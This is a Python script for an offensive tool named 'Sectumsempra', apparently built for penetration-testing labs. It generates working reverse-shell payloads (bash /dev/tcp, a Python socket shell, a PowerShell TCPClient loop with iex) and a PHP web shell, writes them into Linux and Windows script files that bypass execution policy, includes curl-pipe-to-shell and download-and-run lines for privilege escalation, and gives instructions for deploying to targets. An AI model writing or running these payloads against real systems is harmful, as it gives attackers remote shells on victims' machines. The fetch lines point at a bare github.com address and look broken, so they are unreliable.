import sys
import os
import re
import socket

def get_attack_ip():
    """Detects the local tunnel interface IP address (tun0) or default fallback route."""
    try:
        import netifaces
        if 'tun0' in netifaces.interfaces():
            return netifaces.ifaddresses('tun0')[socket.AF_INET]['addr']
    except Exception:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.10.10.10", 80))
        ip = s.getsockname()
        s.close()
        return ip[0] # Fixat: Returnerar enbart IP-strängen från socket-tupeln
    except Exception:
        return "YOUR_ATTACK_IP"

def generate_payloads(target_ip, attack_ip, lport):
    """Generates standard multi-platform reverse shell vectors."""
    payloads = {
        "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
        "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
        "windows_powershell": f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + $attack_ip + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}",
        "php_web": "<?php system($_GET['cmd']); ?>"
    }
    return payloads

def write_linux_payload(target_ip, payloads, lport):
    """Generates the Linux deployment script execution file."""
    filename = f"payload_linux_{target_ip.replace('.', '_')}.sh"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("#!/bin/bash\n")
        f.write(f"# Target configuration: {target_ip}\n")
        f.write(f"# Attacker listener: {lport}\n\n")
        f.write(f"echo '[*] Executing Linux staging sequence...'\n")
        f.write(f"echo 'Staging string: {payloads['linux_bash']}'\n\n")
        f.write(f"# Post-exploitation infrastructure check\n")
        f.write(f"echo 'Automated local privilege escalation path: curl -sL https://github.com | sh'\n")
    return filename

def write_windows_payload(target_ip, payloads, lport):
    """Generates the Windows PowerShell automation execution file."""
    filename = f"payload_windows_{target_ip.replace('.', '_')}.ps1"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"# Target configuration: {target_ip}\n\n")
        f.write("Set-ExecutionPolicy Bypass -Scope Process -Force\n\n")
        f.write(f"# Reverse connection payload configuration\n")
        f.write(f"# Execution string: {payloads['windows_powershell']}\n\n")
        f.write(f"# Post-exploitation infrastructure check\n")
        f.write(f"Write-Host 'Automated local privilege escalation path: iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe'\n")
    return filename

def main():
    print("==========================================================================")
    print(" >>> Sectumsempra v1.0 - Automated Payload & Post-Exploitation Engine <<<")
    print("==========================================================================")
    
    print("Enter Target IP address: ", end="")
    target_ip = input().strip()
    if not target_ip: return
    
    attack_ip = get_attack_ip()
    print(f"[*] Local network interface address identified: {attack_ip}")
    
    print("Set Local Port (LPORT) [Default 4444]: ", end="")
    lport_input = input().strip()
    lport = int(lport_input) if lport_input else 4444
    
    print("\n[*] Initializing script processing routines...")
    payloads = generate_payloads(target_ip, attack_ip, lport)
    
    linux_file = write_linux_payload(target_ip, payloads, lport)
    win_file = write_windows_payload(target_ip, payloads, lport)
    
    print("\n" + "="*16 + " SECTUMSEMPRA: PAYLOAD GENERATION COMPLETE " + "="*15)
    print(f"[+] Linux Administration Script Ready:   {os.getcwd()}/{linux_file}")
    print(f"[+] Windows PowerShell Automation Ready: {os.getcwd()}/{win_file}")
    print("==========================================================================")
    print("\n[!] Standard operational instructions:")
    print(f" 1. Initialize host interface listener: nc -lvnp {lport}")
    print(f" 2. Deploy generated payload scripts directly within verified target vectors.")
    print(f" 3. Upon session establishment, execute the embedded stager string to audit system paths.")

if __name__ == "__main__":
    main()
